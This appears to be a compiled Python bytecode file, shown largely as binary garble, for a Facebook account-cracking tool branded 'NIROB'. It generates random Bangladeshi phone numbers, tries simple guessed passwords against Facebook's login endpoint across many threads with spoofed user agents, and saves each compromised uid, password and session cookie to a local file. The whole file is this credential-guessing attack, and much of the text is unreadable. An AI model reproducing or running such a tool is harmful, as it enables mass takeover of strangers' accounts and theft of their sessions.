�
    �1�e�C  �                   �8  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlmZ d dlmZ d dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlmZ d dlmZ d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dlZd dl Z d dlmZ d dlZd dlmZ d dlZ	 d dl Z n&# e$ r  ed�  �          ej        d�  �         Y nw xY w	 d dlZn&# e$ r  ed�  �          ej        d�  �         Y nw xY w	 d dlZn&# e$ r  ed	�  �          ej        d
�  �         Y nw xY wd� Zd dl Z d dlZd dlZd dlZd dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ  d dlmZ d dlmZ  ej!        �   �         Z"e"j#        Z$g d�Z%	 e$d k     se$dk    r
 e&�   �          e$dz
  Z'n# e($ r  e&�   �          Y nw xY w ej!        �   �         Z)e)j*        Z+e)j#        Z,e)j-        Z.e%e'         Z/dZ0dZ1dZ2dZ3dZ4dZ5dZ6dZ7e0e1e2e3e4e5e6e7gZ8 ej9        e8�  �        Z:i i cZ;Z<d\  Z=Z>Z?g g g cZ@ZAZBg ZCg Z>g ZDg ZEd aFg aGg aHd aFdZIdZJdZKddiZLdddddd d!d"d#d$d%d&d'�ZMd(ZNg aO ej9        g d)��  �        ZP eQd*�  �        D ]�ZRd+ZS ej9        g d,��  �        ZTd-ZU ej9        g d.��  �        ZV ejW        dd/�  �        ZX ej9        g d.��  �        ZYd0ZZ ejW        d1d2�  �        Z[d3Z\ ejW        d4d5�  �        Z] ejW        d6d7�  �        Z^d8Z_eS� d9eT� d:eU� eV� eX� eY� d;eZ� e[� d<e\� d<e]� d<e^� d9e_� �Z`t�          �a                    e`�  �         �� ej9        g d)��  �        ZP eQd=�  �        D ]�Zbd+ZS ej9        g d>��  �        ZTd? eceP�  �        � �ZUd0ZZ ejW        d1d2�  �        Z[d3Z\ ejW        d4d5�  �        Z] ejW        d6d7�  �        Z^d8Z_eS� d9eT� d:eU� d;eZ� e[� d<e\� d<e]� d<e^� d9e_� �Z`t�          �a                    e`�  �         ��d@� ZddAZedB� ZfdC� ZgdD� Zh ef�   �          dS )E�    N)�BeautifulSoup)�ThreadPoolExecutor)�ConnectionErroru!   
 [✓] installing requests !...
zpip install requestsu    
 [✓] installing futures !...
zpip install futuresu   
 [✓] installing bs4 !...
zpip install bs4c                  �$   � t          d�  �         d S )Nu�   [1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)�print� �    �zz.py�linexr       s)   � ��  R�  S�  S�  S�  S�  Sr	   )�datetime)�January�February�March�April�May�June�July�Agustus�	September�October�November�December�   �   z[1;97mz[1;31mz[1;32mz[1;95mz[0m)r   r   r   zhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
user-agentaK  Mozilla/5.0 (Windows NT 10.0.10586.713; osmeta 8.3.47029472) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/8.3.47029472 Build/47029472 [FBAN/FBW;FBAV/75.0.0.50.22;FBBV/47052341;FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.10586.753;FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]r   r   r   r   r   r   r   �Augustusr   r   r   r   )�01�02�03�04�05�06�07�08�09�10�11�12F(}  zGT-1015zGT-1020zGT-1030zGT-1035zGT-1040zGT-1045zGT-1050zGT-1240zGT-1440zGT-1450zGT-18190zGT-18262z	GT-19060IzGT-19082zGT-19083zGT-19105zGT-19152zGT-19192zGT-19300zGT-19505zGT-2000zGT-20000zGT-200szGT-3000z	GT-414XOPzGT-6918zGT-7010zGT-7020zGT-7030zGT-7040zGT-7050zGT-7100zGT-7105zGT-7110zGT-7205zGT-7210zGT-7240RzGT-7245zGT-7303zGT-7310zGT-7320zGT-7325zGT-7326zGT-7340zGT-7405zGT-7550   5GT-8005zGT-8010zGT-81zGT-810zGT-8105zGT-8110zGT-8220SzGT-8410zGT-9300zGT-9320zGT-93GzGT-A7100zGT-A9500z
GT-ANDROIDzGT-B2710zGT-B5330z	GT-B5330Bz	GT-B5330LzGT-B5330ZKAINUzGT-B5510zGT-B5512zGT-B5722zGT-B7510zGT-B7722zGT-B7810zGT-B9150zGT-B9388zGT-C3010zGT-C3262z	GT-C3310RzGT-C3312z	GT-C3312Rz	GT-C3313TzGT-C3322z	GT-C3322izGT-C3520z	GT-C3520IzGT-C3592zGT-C3595zGT-C3782zGT-C6712z	GT-E1282TzGT-E1500zGT-E2200zGT-E2202zGT-E2250zGT-E2252zGT-E2600z	GT-E2652WzGT-E3210zGT-E3309z	GT-E3309Iz	GT-E3309TzGT-G530HzGT-g900fzGT-G930FzGT-H9500zGT-I5508zGT-I5801zGT-I6410zGT-I8150zGT-I8160OKLTPAzGT-I8160ZWLTTTzGT-I8258z	GT-I8262DzGT-I8268zGT-I8505zGT-I8530BAABTUzGT-I8530BALCHOzGT-I8530BALTTTz	GT-I8550EzGT-i8700zGT-I8750zGT-I900z	GT-I9008LzGT-i9040z	GT-I9080Ez	GT-I9082CzGT-I9082EWAINUz	GT-I9082iz	GT-I9100GzGT-I9100LKLCHTz	GT-I9100Mz	GT-I9100Pz	GT-I9100TzGT-I9105UANDBTz	GT-I9128Ez	GT-I9128Iz	GT-I9128Vz	GT-I9158Pz	GT-I9158Vz	GT-I9168Iz	GT-I9192Iz	GT-I9195Hz	GT-I9195LzGT-I9250z	GT-I9303Iz	GT-I9305Nz	GT-I9308Iz	GT-I9505Gz	GT-I9505Xz	GT-I9507VzGT-I9600zGT-m190zGT-M5650zGT-miniz	GT-N5000SzGT-N5100zGT-N5105zGT-N5110zGT-N5120z	GT-N7000BzGT-N7005z	GT-N7100TzGT-N7102zGT-N7105z	GT-N7105TzGT-N7108z	GT-N7108DzGT-N8000zGT-N8005zGT-N8010zGT-N8020zGT-N9000zGT-N9505zGT-P1000CWAXSAz	GT-P1000Mz	GT-P1000TzGT-P1010z	GT-P3100BzGT-P3105zGT-P3108zGT-P3110zGT-P5100zGT-P5200zGT-P5210XD1zGT-P5220zGT-P6200z	GT-P6200LzGT-P6201zGT-P6210zGT-P6211zGT-P6800zGT-P7100zGT-P7300z	GT-P7300BzGT-P7310zGT-P7320z	GT-P7500Dz	GT-P7500Mz	GT-P7500Rz	GT-P7500VzGT-P7501zGT-P7511zGT-S3330zGT-S3332zGT-S3333zGT-S3370zGT-S3518zGT-S3570z	GT-S3600izGT-S3650z	GT-S3653Wz	GT-S3770Kz	GT-S3770Mz	GT-S3800WzGT-S3802zGT-S3850zGT-S5220z	GT-S5220RzGT-S5222zGT-S5230z	GT-S5230Wz	GT-S5233Tz	GT-s5233wzGT-S5250zGT-S5253zGT-s5260zGT-S5280zGT-S5282z	GT-S5283BzGT-S5292zGT-S5300z	GT-S5300LzGT-S5301z	GT-S5301Bz	GT-S5301LzGT-S5302z	GT-S5302BzGT-S5303z	GT-S5303BzGT-S5310z	GT-S5310Bz	GT-S5310Cz	GT-S5310Ez	GT-S5310Gz	GT-S5310Iz	GT-S5310Lz	GT-S5310Mz	GT-S5310NzGT-S5312z	GT-S5312Bz	GT-S5312Cz	GT-S5312LzGT-S5330zGT-S5360z	GT-S5360Bz	GT-S5360Lz	GT-S5360TzGT-S5363zGT-S5367zGT-S5369zGT-S5380z	GT-S5380DzGT-S5500zGT-S5560z	GT-S5560iz	GT-S5570Bz	GT-S5570Iz	GT-S5570LzGT-S5578zGT-S5600zGT-S5603zGT-S5610z	GT-S5610KzGT-S5611zGT-S5620zGT-S5670z	GT-S5670BzGT-S5670HKBZTAzGT-S5690z	GT-S5690RzGT-S5830z	GT-S5830Dz	GT-S5830Gz	GT-S5830iz	GT-S5830Lz	GT-S5830Mz	GT-S5830Tz	GT-S5830Vz	GT-S5831izGT-S5838z	GT-S5839izGT-S6010zGT-S6010BBABTUzGT-S6012z	GT-S6012BzGT-S6102z	GT-S6102Bz	GT-S6293Tz	GT-S6310BzGT-S6310ZWAMIDzGT-S6312z	GT-S6313TzGT-S6352zGT-S6500z	GT-S6500Dz	GT-S6500LzGT-S6790z	GT-S6790Lz	GT-S6790Nz	GT-S6792LzGT-S6800zGT-S6800HKAXFAzGT-S6802zGT-S6810z	GT-S6810Bz	GT-S6810Ez	GT-S6810Lz	GT-S6810MzGT-S6810MBASERz	GT-S6810PzGT-S6812z	GT-S6812Bz	GT-S6812Cz	GT-S6812izGT-S6818z	GT-S6818Vz	GT-S7230Ez	GT-S7233Ez	GT-S7250DzGT-S7262zGT-S7270z	GT-S7270LzGT-S7272z	GT-S7272Cz	GT-S7273TzGT-S7278z	GT-S7278UzGT-S7390z	GT-S7390Gz	GT-S7390LzGT-S7392z	GT-S7392LzGT-S7500zGT-S7500ABABTUzGT-S7500ABADBTzGT-S7500ABTTLPzGT-S7500CWADBTz	GT-S7500Lz	GT-S7500TzGT-S7560z	GT-S7560MzGT-S7562z	GT-S7562Cz	GT-S7562iz	GT-S7562LzGT-S7566zGT-S7568z	GT-S7568IzGT-S7572z	GT-S7580Ez	GT-S7583TzGT-S758XzGT-S7592zGT-S7710z	GT-S7710LzGT-S7898z	GT-S7898IzGT-S8500zGT-S8530zGT-S8600z	GT-STB919zGT-T140zGT-T150zGT-V8azGT-V8izGT-VC818z	GT-VM919SzGT-W131zGT-W153zGT-X831zGT-X853zGT-X870zGT-X890zGT-Y8750i�  zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9r&   r'   r(   �13�14�15�16�17z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.i'  )r,   r-   r.   r/   r&   r'   r(   r0   z TL-tl; c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )N�
g����MbP?)�sys�stdout�write�flush�time�sleep)�z�es     r
   �jalanr`   t   s\   � ���X� � ���
��������
�������
�5������ r	   u�  
 ╔╗╔╦╦═╗╔═╗╔╗   ╦═╗╔═╗╦ ╦╔╦╗╔═╗╔╗╔
 ║║║║╠╦╝║ ║╠╩╗  ╠╦╝╠═╣╠═╣║║║╠═╣║║║
 ╝╚╝╩╩╚═╚═╝╚═╝  ╩╚═╩ ╩╩ ╩╩ ╩╩ ╩╝╚╝ [0;37;47m[1;37;47m[1;31m니로브[1;37;40m[1;97m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[=] DEVELOPER : NIROB RAHMAN
[=] THE NAME OF A : BRAND
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━c                  �,  � t          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t	          �   �          t          d�  �        } | dk    rt          �   �          d dk    rt          j        d�  �         d S d S )N�clearz[A] RANDOM CLONING  z[B] EXIT�[=] CHOOSE : �1rQ   �exit)�os�systemr`   �logor   �input�NIROB)�opts    r
   �biologyrl   �   s�   � ��I�g����	�$�K�K�K�	�
 �!�!�!�	�*����	�G�G�G�
��
 �
 �C�
�c�z�z������s�{�{�
�	�&�����t� �{r	   c                  �  � g } t          j        d�  �         t          t          �  �         t	          �   �          t          d�  �         t	          �   �          t          d�  �        }t          j        d�  �         t          t          �  �         t          d�  �         t          t          d�  �        �  �        }t          |�  �        D ]C}d�	                    d� t          d�  �        D �   �         �  �        }| �
                    |�  �         �Dt          d�	�  �        5 }t          j        d�  �         t          t          �  �         t          t          | �  �        �  �        }t	          �   �          t          d
|z   �  �         t          d|z   �  �         t          d�  �         t	          �   �          | D ]0}||z   }|dd �         dg}	|�                    t          ||	|�  �         �1	 d d d �  �         n# 1 swxY w Y   t	          �   �          d S )Nrb   z&[=] SIM CODE : 017 019 018 016 013 015rc   z#[=] CRACK LIMIT : 10000 20000 50000� c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)�random�choice�string�digits)�.0�_s     r
   �	<genexpr>zNIROB.<locals>.<genexpr>�   s.   � � � �B�B�A�6�=���/�/�B�B�B�B�B�Br	   �   �   )�max_workersz[=] CODE : [1;97mz[=] LIMIT: [1;92mz-[=] IF NO RESULTS TURN [ON/OFF] AIRPLANE MODEr   u   ১২৩৪৫৬)rf   rg   r   rh   r   r`   ri   �int�range�join�append�
ThreadPool�str�len�submit�rcrack)
�user�code�limit�nmbr�nmp�yaari�tl�love�uid�pwxs
             r
   rj   rj   �   s  � �	�D��I�g����	�$�K�K�K�	�G�G�G�	�
2�3�3�3�	�G�G�G���!�!�D��I�g����	�$�K�K�K�	�
/�0�0�0���o�&�&�'�'�E��e��� � ���7�7�B�B��q���B�B�B�B�B�S�	�[�[������	��	#�	#�	#� &�u��Y�w����
�4�[�[�[�
�c�$�i�i�.�.�R�
�W�W�W�
�"�4�'�(�(�(�
�"�2�%�&�&�&�
�:�;�;�;�
�W�W�W�� &� &����I�c��!�"�"�X�*�+�c��l�l�6�#�c�"�%�%�%�%�&�&� &� &� &� &� &� &� &� &� &� &���� &� &� &� &� 
�G�G�G�G�Gs   �CG/�/G3�6G3c                 �  � 	 |D �]�}t          j        �   �         }t          j        �                    d|� d�t
          t          t          �  �        fz  �  �        f t          j        �                    �   �          t          j
        t          �  �        }|�                    d�  �        j        }t          j        dt!          |�  �        �  �        �                    d�  �        t          j        dt!          |�  �        �  �        �                    d�  �        t          j        dt!          |�  �        �  �        �                    d�  �        t          j        dt!          |�  �        �  �        �                    d�  �        d	d	| |d
d�	}i dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d�d'd(�d)|�}|�                    d*||�+�  �        j        }	|j        �                    �   �         �                    �   �         }
d,|
v r�d-�                    d.� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d/d0�         }t1          d1| z   d2z   |z   d3z   |z   d4z   �  �         t3          d5d6�  �        �                    | d2z   |z   d7z   �  �         t          �                    |�  �          n���t
          dz  ad S #  Y d S xY w)8Nz:[1;91m[[1;92mNIROB-XD[1;91m][1;97m-[1;91m[[1;97m%s/z,[1;91m][1:97m-[1;91m[OK:[1;92m%s[1;91m]zhttps://p.facebook.comzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"rQ   zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�login�	authorityzp.facebook.com�method�GET�scheme�https�acceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=0.9zcache-controlz	max-age=0z	sec-ch-uaz("Chromium";v="107", "Not=A?Brand";v="24"zsec-ch-ua-mobilez?1zsec-ch-ua-platformz	"Android"zsec-fetch-dest�documentzsec-fetch-mode�navigatezsec-fetch-site�nonezsec-fetch-userzupgrade-insecure-requestsrd   r   zAhttps://www.facebook.com/login/device-based/regular/login/?refsrc)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S )�=r   )rt   �key�values      r
   �
<listcomp>zrcrack.<locals>.<listcomp>�   s$   � �U�U�U�Y�S��3�s�7�5�=�U�U�Ur	   �   �   z[1;32m[NIROB-OK]  z | u)     
[1;34m[COOKIE [1;91m[🍌] = [1;92mz [1;95mz/sdcard/NIROB.txt�arW   )�requests�SessionrX   rY   rZ   �loopr�   �oksr[   rp   rq   �ugen�get�text�re�searchr   �group�post�cookies�get_dict�keysr|   �itemsr   �openr}   )r�   r�   r�   �ps�session�pro�free_fb�log_data�header_freefb�lo�log_cookies�coki�cids                r
   r�   r�   �   ss  � �/�� +� +�b�����7��:���  b�df�  b�  b�  b�  dh�  il�  mp�  iq�  iq�  cr�  r�  s�  s�  t�  t��:������	��t�	�	�3��[�[�1�2�2�7�7�
�)�.��G���
=�
=�
C�
C�A�
F�
F��Y�5�s�7�|�|�D�D�J�J�1�M�M�
�)�/��W���
>�
>�
D�
D�Q�
G�
G�
�	�+�S��\�\�:�:�@�@��C�C����
��	� 	�8�"��#�"���"� ��"� �  c�	"�
 !�"5�"� !�"2�"� ��"� �F�"� "�4�"� $�[�"�  ��"�  ��"�  ��"�  ��"� +�C�"�  �S�!"�=�" 	���X�^f�o|��}�}�  	C�2���'�'�)�)�.�.�0�0�;��+���	���U�U�'�/�2J�2J�2L�2L�2R�2R�2T�2T�U�U�U�	V�	V�D�
�q��t�*�C�	�
&��
+�U�
2�B�
6�;p�
p�qu�
u�  yF�  F�  G�  G�  G��	�c�"�"�(�(��U��2��d�):�;�;�;��J�J�s�O�O�O�	�E����'�$�$�$����$�$���s   �KK
 �
K)ir�   �bs4�jsonrX   rp   r   r\   r�   �
subprocess�platform�structr   �sop�concurrent.futuresr   r~   rf   �tred�base64rr   �	mechanize�requests.exceptionsr   �ImportErrorr   rg   �
concurrentr   �	threading�	itertools�uuid�zlib�ahmadAXI�now�ct�month�n�bulanre   �nTemp�
ValueError�current�year�ta�bu�day�ha�oprD   rA   r<   r?   r6   rI   rC   rB   �my_colorrq   �warnar�   �data2�aman�cp�salah�ubahP�fuck�pwBaru�ok�idr�   r�   r�   �cps�
url_lookup�url_mb�url_ip�header_grup�	bulan_ttl�doner�   �gtr{   �x�aa�b�c�d�	randranger_   �f�g�h�i�j�k�l�uaku2r}   �xdr   r`   rh   rl   rj   r�   r   r	   r
   �<module>r     s�  �� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� $� $� $� $� $� $� ?� ?� ?� ?� ?� ?� 	�	�	�	� ���� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� O� $� $� $� $� $� $� 9� 9� 9� 9� 9� 9� ���� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� 8� ���� ?� ?� ?� ?� ?� ?� � � � � /� /� /� /� /� /� ����&��O�O�O�O��� &� &� &�	�E�
/�0�0�0��B�I�$�%�%�%�%�%�&����%�������� %� %� %�	�E�
.�/�/�/��B�I�#�$�$�$�$�$�%����!��J�J�J�J��� !� !� !�	�E�
*�+�+�+��B�I�� � � � � �!����S� S� S� |� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� {� =� =� =� =� =� =� � � � � � � � � � � � � �X�\�^�^���H�� 	D�  	D�  	D����1�u�u��B����������E�E�E��� � � ��D�F�F�F�F�F����� �(�,�.�.���\���]���[��
�5�\�������������������A�q�!�Q��1�a������h�����b�
��U����R���R�� ��d�6�������	����������%�
�	!��	%���  k�  l���J�g�W�TY�ag�ou�  ~H�  P[�  cl�  t~�  FP�  Q�  Q�	������V�]�  EE�  EE�  EE�  FE�  FE��	��t��� � �A�'�B��f�m�Y�Y�Y�Z�Z�A��A��f�m�  V�  V�  V�  W�  W�A��f��q�#���A��f�m�  V�  V�  V�  W�  W�A�6�A��f��r�#���A�	�A��f��t�D�!�!�A��f��r�#���A��A��<�<�1�<�<��<�1�<�a�<��<�<�a�<��<�<�Q�<�<��<�<�Q�<�<��<�<�E��K�K�������V�]�  EE�  EE�  EE�  FE�  FE��
�%��,�,� � �B�+��
�&�-�=�=�=�
>�
>��
�S�S��W�W�
�
��
:��
�&�
�2�c�
"�
"��
��
�&�
�4��
%�
%��
�&�
�2�c�
"�
"��
 ���6�6�a�6�6�1�6�6��6�1�6�6�q�6�6�1�6�6�q�6�6�1�6�6�����E������ � �B��� � �� � �>5� 5� 5�n ��	�	�	�	�	sH   �:B? �? C"�!C"�&C+ �+ D�D�D � D:�9D:�-G	 �	G�G